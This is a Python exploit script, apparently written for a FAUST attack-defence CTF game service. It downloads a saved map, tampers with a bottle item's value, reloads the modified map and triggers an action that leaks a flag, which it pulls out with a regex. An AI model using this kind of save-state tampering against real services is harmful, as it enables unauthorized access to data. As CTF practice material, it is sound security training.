#!/bin/python

import sys
import json
import base64
import socket
import re

# self written
import binreader
from util import *

flag_format = "(FAUST_[^ ]{32})"

ip = sys.argv[1]
port = int(sys.argv[2])
map_name = sys.argv[3]
outmap = sys.argv[4]

"""
STEP 1
Play and download game
"""
sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
sock.connect((ip, port, 0, 0))

# initial connect
val = communicate(sock, {"type": "HELO", "cmd": "new", "map": map_name})
# get the map
b64blob = communicate(sock, {"type": "SAVE"})
print(b64blob)
binblob = base64.b64decode(b64blob)
mapjson = binreader.map2json(None, binblob)

"""
STEP 2
Analyse the map
Find a bottle and give it enough alcohol
"""
room = None
rname = None
bottle = None
for rname in mapjson["rooms"]:
	r = mapjson["rooms"][rname]
	if not r["saveable"]: # cannot start here anyway
		continue
	bottle = None
	for uuid, el in r["elements"].items():
		if el["id"] == 5: # found a bottle
			bottle = (uuid, el)
	if not bottle: # no bottle, don't care
		continue
	room = r
	break # take the first matching room

if not room:
	print("No saveable room with bottles found")
	sys.exit(1)

mapjson["globals"]["room"] = rname
mapjson["globals"]["posx"] = 2
mapjson["globals"]["posy"] = 2
bottle[1]["value"] = "4|99%"

# for debugging, write the map
with open(outmap, "w") as outf:
	json.dump(mapjson, outf, indent='\t')

"""
STEP 3
Upload the custom map
Play and drink the bottle
"""
play_map = base64.b64encode(json.dumps(mapjson).encode()).decode()
val = communicate(sock, {"type": "HELO", "cmd": "load", "map": play_map})
dream = communicate(sock, {"type": "INAK", "pos": [bottle[1]["x"], bottle[1]["y"]]})
m = re.search(flag_format, dream)
if not m:
	print("NO FLAG FOUND", dream)
else:
	print(">>", m.group(1))

send_json(sock, {"type": "GBYE"}) # end communication. no answer expected
sock.close()

